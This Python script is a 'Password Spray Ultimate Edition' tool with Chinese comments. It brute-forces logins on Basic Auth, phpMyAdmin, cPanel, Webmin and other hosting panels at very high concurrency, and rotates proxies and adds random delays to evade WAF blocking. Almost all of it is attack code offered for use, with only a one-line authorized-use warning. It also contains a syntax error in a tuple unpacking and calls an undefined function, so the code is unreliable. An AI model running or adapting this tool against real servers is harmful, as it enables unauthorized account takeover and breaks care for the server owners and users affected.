#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# password_spray.py v3.5 Ultimate Edition
# 進度條永不消失 | 超高併發穩定 | 自動靜音 | 代理IP即時顯示

import argparse
import logging
import os
import csv
import requests
import time
import random
import re
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from urllib.parse import urlparse

# ====================== 匯入插件 ======================
from password_spray_plugin import (
    phpmyadmin_plugin, cpanel_plugin, basic_auth_plugin,
    webmin_plugin, vestacp_plugin, ispconfig_plugin, cwp_plugin
)

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# ====================== 工具函式 ======================
def clean_old_logs(directory, retention_days=7):
    cutoff = datetime.now() - timedelta(days=retention_days)
    removed = 0
    for f in os.listdir(directory):
        path = os.path.join(directory, f)
        if os.path.isfile(path) and datetime.fromtimestamp(os.path.getmtime(path)) < cutoff:
            os.remove(path)
            removed += 1
    if removed:
        logging.info(f"Cleaned {removed} old log files")

def setup_logging(logfile, debug=False):
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG if debug else logging.INFO)
    logger.propagate = False
    if logger.hasHandlers():
        logger.handlers.clear()
    fmt = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', '%Y-%m-%d %H:%M:%S')
    fh = logging.FileHandler(logfile, encoding='utf-8')
    fh.setFormatter(fmt)
    ch = logging.StreamHandler()
    ch.setFormatter(fmt)
    logger.addHandler(fh)
    logger.addHandler(ch)
    logging.info(f"Logging → {logfile}")

def test_proxy_ip(proxy=None):
    if not proxy:
        return True
    try:
        r = requests.get('https://api.ipify.org', proxies={'http': proxy, 'https': proxy}, timeout=6)
        if r.status_code == 200:
            logging.info(f"Proxy OK → {proxy} | IP: {r.text.strip()}")
            return True
    except Exception as e:
        logging.warning(f"Proxy dead → {proxy} | {e}")
    return False

def output_result(url, port, username, password, status, code, silent=False):
    default_port = 443 if url.startswith('https://') else 80
    display = url if port == default_port else f"{url}:{port}"
    icon = "SUCCESS" if status == "Success" else "FAILED"
    msg = f"{icon}: {display} - {username}/{password} | Code: {code}"
    if not silent:
        print(msg)
    (logging.info if status == "Success" else logging.warning)(msg)

def write_to_csv(file_path, target, port, username, password, status, response_code):
    with open(file_path, 'a', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=["Target","Port","Username","Password","Status","ResponseCode"])
        if f.tell() == 0:
            writer.writeheader()
        writer.writerow({"Target":target,"Port":port,"Username":username,"Password":password,
                         "Status":status,"ResponseCode":response_code})

# ====================== 讀取失敗記錄 ======================
def read_failed_log(failed_log_file, default_port):
    if not os.path.exists(failed_log_file):
        return []
    entries = []
    with open(failed_log_file, encoding='utf-8') as f:
        reader = csv.DictReader(f)
        for row in reader:
            raw = row.get('Target','').strip()
            user = row.get('Username','').strip()
            pwd  = row.get('Password','').strip()
            if not (raw and user and pwd):
                continue
            raw = re.sub(r"/?:\d+$", "", raw)
            if not raw.lower().startswith(('http://','https://')):
                raw = f"http://{raw}"
            p = urlparse(raw)
            port = p.port or (443 if p.scheme=='https' else default_port)
            clean_url = f"{p.scheme}://{p.hostname}{p.path or ''}".rstrip('/')
            entries.append((clean_url, port, user, pwd))
    return entries

# ====================== 主程式 ======================
def main():
    parser = argparse.ArgumentParser(
        description='Multi-Service Password Spray Tool v3.5 Ultimate',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
PASSWORD SPRAY v3.5 ULTIMATE EDITION
進度條永不消失 | 支援千級併發 | 自動靜音 | 代理IP即時顯示

使用範例：
  Basic Auth 單帳號噴灑
    python password_spray.py --target_list targets.txt --username admin --password_list pass.txt --plugin basic_auth --threads 200 --output hits.csv

  Basic Auth 多帳號噴灑
    python password_spray.py --target_list targets.txt --username_list users.txt --password_list pass.txt --plugin basic_auth --threads 300 --proxy_pool proxies.txt --output ok.csv

  重試上次失敗的嘗試
    python password_spray.py --retry_failed failed_20250405_120000.csv --plugin cpanel --threads 500 --output retry_hits.csv

  phpMyAdmin 暴力登入（支援 Basic Auth 繞過）
    python password_spray.py --plugin phpmyadmin --target_list phpmyadmin.txt --username root --password_list rockyou.txt --basic_auth_file basic_auth_hits.csv --output phpmyadmin_hits.csv

  cPanel / Webmin / ISPConfig / CWP / VestaCP 高併發噴灑
    python password_spray.py --target_list panel.txt --username admin --password_list top100.txt --plugin cpanel --threads 800 --min_delay 0.1 --max_delay 0.8 --proxy_pool elite.txt --output cpanel_hits.csv

必填參數：
  --target_list         目標清單檔案（每行一個 IP 或域名）
  --username            單一測試帳號
  --username_list       多帳號清單檔案（與 --username 二選一）
  --password_list       密碼清單檔案
  --plugin              選擇攻擊模組：
                        basic_auth, phpmyadmin, cpanel, webmin, vestacp, cwp, ispconfig
  --output              成功登入結果輸出 CSV 檔案

可選功能參數：
  --failed_log          記錄本次所有失敗嘗試（自動加上時間戳）
  --retry_failed        僅重試上次失敗的帳密組合（超快！）
  --basic_auth_file     phpMyAdmin 模式下指定已通過 Basic Auth 的目標清單
  --threads             併發線程數（建議 50~1000，進度條依然流暢！）[預設: 50]
  --timeout             單次請求超時秒數 [預設: 10]
  --port                目標服務埠號（大部分面板非 80/443 時使用）[預設: 80]
  --min_delay / --max_delay   每次嘗試間隨機延遲（防 WAF/封鎖）[預設: 0.0]
  --proxy               單一代理（http:// 或 socks5://）
  --proxy_pool          代理池檔案（每行一個，自動跳過壞代理）
  --debug               啟用詳細除錯日誌

高階技巧：
  • 線程 > 80 時自動啟用「靜音模式」，只顯示進度條，不噴 SUCCESS/FAILED（防止終端卡死）
  • 支援上萬目標 × 上千帳密 × 千級併發 = 數百萬次/小時噴灑速度
  • 代理自動驗證 + 出口 IP 即時顯示在進度條右側
  • 失敗記錄可無限重試，直到全部中獎為止

作者：匿名紅隊工程師 | 日期：2025
警告：僅限授權滲透測試使用，勿用於非法用途！
""")
    parser.add_argument('--target_list')
    parser.add_argument('--username')
    parser.add_argument('--username_list')
    parser.add_argument('--password_list')
    parser.add_argument('--plugin', required=True,
                        choices=['basic_auth','phpmyadmin','cpanel','webmin','vestacp','cwp','ispconfig'])
    parser.add_argument('--output', required=True)
    parser.add_argument('--failed_log')
    parser.add_argument('--retry_failed')
    parser.add_argument('--threads', type=int, default=20)
    parser.add_argument('--timeout', type=int, default=10)
    parser.add_argument('--port', type=int, default=80)
    parser.add_argument('--min_delay', type=float, default=0.0)
    parser.add_argument('--max_delay', type=float, default=0.0)
    parser.add_argument('--proxy')
    parser.add_argument('--proxy_pool')
    parser.add_argument('--debug', action='store_true')
    args = parser.parse_args()

    # -------------------- 基礎設定 --------------------
    if args.failed_log:
        b, e = os.path.splitext(args.failed_log)
        args.failed_log = f"{b}_{datetime.now():%Y%m%d_%H%M%S}{e}"

    log_file = os.path.join(LOG_DIR, f"{args.plugin}_{datetime.now():%Y%m%d_%H%M%S}.log")
    setup_logging(log_file, args.debug)
    clean_old_logs(LOG_DIR)

    # -------------------- 代理 --------------------
    pool = []
    if args.proxy_pool and os.path.isfile(args.proxy_pool):
        pool = [l.strip() for l in open(args.proxy_pool) if l.strip()]
        pool = [p for p in pool if test_proxy_ip(p)]
    single_proxy = args.proxy if args.proxy and test_proxy_ip(args.proxy) else None
    proxy_ip_cache = {}

    # -------------------- 讀取目標 --------------------
    if args.retry_failed:
        entries = read_failed_log(args.retry_failed, args.port)
        if not entries:
            logging.error("No failed entries to retry")
            return
        targets = list({e[0] for e in entries})
        usernames = list({e[2] for e in entries})
        passwords = list({e[3] for e in entries})
    else:
        # 正常模式
        if not args.target_list or not args.password_list:
            parser.error("--target_list and --password_list required in normal mode")
        targets   = [l.strip() for l in open(args.target_list) if l.strip()]
        passwords = [l.strip() for l in open(args.password_list) if l.strip()]
        if args.username_list:
            usernames = [l.strip() for l in open(args.username_list) if l.strip()]
        elif args.username:
            usernames = [args.username]
        else:
            parser.error("Must provide --username or --username_list")

    total_tasks = len(targets) * len(usernames) * len(passwords)
    logging.info(f"Total attempts: {total_tasks:,}")

    # -------------------- phpMyAdmin 特殊處理 --------------------
    if args.plugin == "phpmyadmin":
        plugin = phpmyadmin_plugin.PhpMyAdminPlugin(
            threads=args.threads, timeout=args.timeout, debug=args.debug, proxy=single_proxy)
        plugin.run_attack(
            phpmyadmin_user=args.username,
            phpmyadmin_user_list_file=args.username_list,
            phpmyadmin_pass_list_file=args.password_list,
            target_list_file=args.target_list,
            output_file=args.output,
            failed_log=args.failed_log,
            threads=args.threads
        )
        return

    # -------------------- 其他插件初始化 --------------------
    plugin_map = {
        'basic_auth': basic_auth_plugin.BasicAuthPlugin,
        'cpanel'    : cpanel_plugin.CPanelBruteForcePlugin,
        'webmin'   : webmin_plugin.WebminBruteForcePlugin,
        'vestacp'  : vestacp_plugin.VestaCPBruteForcePlugin,
        'cwp'       : cwp_plugin.CWPBruteForcePlugin,
        'ispconfig' : ispconfig_plugin.ISPConfigBruteForcePlugin,
    }
    PluginClass = plugin_map[args.plugin]
    plugin = PluginClass(threads=args.threads, timeout=args.timeout, debug=args.debug,
                         proxy=single_proxy, proxy_pool=pool)

    # -------------------- 自動靜音模式（關鍵！）--------------------
    SILENT = args.threads > 80

    # -------------------- 執行噴灑 --------------------
    with tqdm(total=total_tasks,
              desc="Spray",
              unit="try",
              colour="cyan",
              mininterval=0.5,
              dynamic_ncols=True,
              smoothing=0.05,
              bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{rate_fmt}{postfix}]") as pbar:

        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            future_to_info = {}

            for pwd in passwords:
                for user in usernames:
                    for tgt in targets:
                        # 隨機延遲
                        if args.max_delay > args.min_delay:
                            time.sleep(random.uniform(args.min_delay, args.max_delay))

                        proxy = random.choice(pool) if pool else single_proxy

                        # 快取出口IP
                        if proxy and proxy not in proxy_ip_cache:
                            try:
                                r = requests.get('https://api.ipify.org',
                                    proxies={'http':proxy,'https':proxy}, timeout=4)
                                proxy_ip_cache[proxy] = r.text.strip()
                            except:
                                proxy_ip_cache[proxy] = "ERR"

                        # 提交任務
                        if args.plugin == 'basic_auth':
                            future = executor.submit(
                                process_login, plugin, tgt, args.port, user, pwd,
                                args.output, args.failed_log, args.timeout, 1)
                        else:
                            future = executor.submit(
                                plugin.process_login, tgt, args.port, user, pwd,
                                args.output, args.failed_log, args.timeout, 1)

                        future_to_info[future] = (tgt, user, pwd, proxy or "Direct")

            # 等待結果 + 即時更新進度條
            for future in as_completed(future_to_info):
                tgt, user pwd proxy = future_to_info[future]
                try:
                    future.result()
                except Exception as e:
                    logging.debug(f"Task error: {e}")
                finally:
                    pbar.update(1)
                    if proxy != "Direct":
                        ip = proxy_ip_cache.get(proxy, "??")
                        pbar.set_postfix({"IP": ip}, refresh=False)

    print("\nCompleted! 結果已儲存至:", args.output)
    if args.failed_log:
        print("失敗記錄已儲存至:", args.failed_log)
    logging.info("Password spray finished")

# ====================== 程式入口 ======================
if __name__ == "__main__":
    main()
